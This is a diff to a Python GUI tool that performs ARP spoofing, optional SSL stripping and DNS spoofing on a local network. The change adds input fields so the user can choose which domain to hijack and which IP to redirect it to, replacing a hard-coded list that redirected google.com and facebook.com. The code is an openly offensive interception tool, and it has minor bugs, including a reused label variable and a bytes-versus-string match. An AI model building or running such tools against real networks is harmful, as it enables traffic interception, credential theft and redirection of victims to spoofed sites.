@@ -37,6 +37,10 @@ choice1 = sg.Checkbox("SSL Stripping", default=False)
 t1 = sg.Input('', enable_events=True, key='-INPUT-', font=('Arial Bold', 20), justification='left')
 t2 = sg.Input('', enable_events=True, key='-INPUT2-', font=('Arial Bold', 20), justification='left')
 t3 = sg.Input('', enable_events=True, key='-INPUT3-', font=('Arial Bold', 20), justification='left')
+t4 = sg.Input('', enable_events=True, key='-INPUT4-', font=('Arial Bold', 20), justification='left')
+t5 = sg.Input('', enable_events=True, key='-INPUT5-', font=('Arial Bold', 20), justification='left')
+
+
 choice2 = sg.Checkbox("ARP Silent mode", default=False)
 
 text1 = sg.Text("Do you want to include SSL stripping?")
@@ -44,12 +48,14 @@ text2 = sg.Text("Insert target IP")
 text3 = sg.Text("Insert target domain")
 text4 = sg.Text("Insert network interface")
 text5 = sg.Text("DNS Silent mode")
+text5 = sg.Text("Website to spoof")
+text6 = sg.Text("IP to spoof (DNS)")
 
 endButton = sg.Button("End attack", visible = False)
     
 attackButton = sg.Button("Attack!")
     
-layout = [[choice1], [choice2], [text2], [t1], [text3], [t2], [text4], [t3], [attackButton], [endButton]]
+layout = [[choice1], [choice2], [text2], [t1], [text3], [t2], [text4], [t3], [text5], [t4], [text6], [t5], [attackButton], [endButton]]
 window = sg.Window("Attack", layout)
 
 def spoof(targetIp, hostIp, attackerIp):
@@ -101,10 +107,15 @@ def end_spoof(targetIp, hostIp, attackerIp):
     correctARP[ARP].hwdst = targetMac
     correctARP[ARP].pdst = targetIp
     sendp(correctARP, iface="enp0s10")
-    
+ 
+website = "google.com."
+spoofIP = "157.240.201.35"
+queueNum = 1
+
 class DNSSpoof:
-    def __init__(self, dictionary, queueNum):
-        self.dictionary = dictionary
+    def __init__(self, website, spoofIP, queueNum):
+        self.website = website
+        self.spoofIP = spoofIP
         self.queueNum = queueNum
         self.queue = NetfilterQueue()
  
@@ -125,9 +136,9 @@ class DNSSpoof:
         if scapyPacket.haslayer(DNSRR):
             try:
                 queryName = scapyPacket[DNSQR].qname
-                if queryName in self.dictionary:
+                if queryName in self.website:
                     scapyPacket[DNS].an = DNSRR(
-                        rrname=queryName, rdata=self.dictionary[queryName])
+                        rrname=queryName, rdata=self.spoofIP)
                     scapyPacket[DNS].ancount = 1
                     del scapyPacket[IP].len
                     del scapyPacket[IP].chksum
@@ -142,22 +153,13 @@ class DNSSpoof:
                 log.error(error)
             packet.set_payload(bytes(scapyPacket))
         return packet.accept()
-        
-        
-
+ 
 def DNSLoop():        
     if __name__ == '__main__':
         try:
             #ip adresses that we want to spoof
-            dictionary = {
-                b"google.com.": "157.240.201.35",
-                b"www.google.com.": "157.240.201.35",
-                b"www.facebook.com.": "142.251.39.100",
-                b"facebook.com.": "142.251.39.100"
-            }
-            queueNum = 1
-            dnsspoof = DNSSpoof(dictionary, queueNum)
-            dnsspoof()
+            spoof = DNSSpoof(website, spoofIP, queueNum)
+            spoof()
         except OSError as error:
             log.error(error)
 
@@ -191,6 +193,8 @@ while True:
         RouterIP = layout[5][0].get()
         targetIp = TargetIP
         hostIp = RouterIP
+        website = layout[9][0].get()
+        spoofIP = layout[11][0].get()
         
         attackerIp = get_if_addr(layout[7][0].get())
         
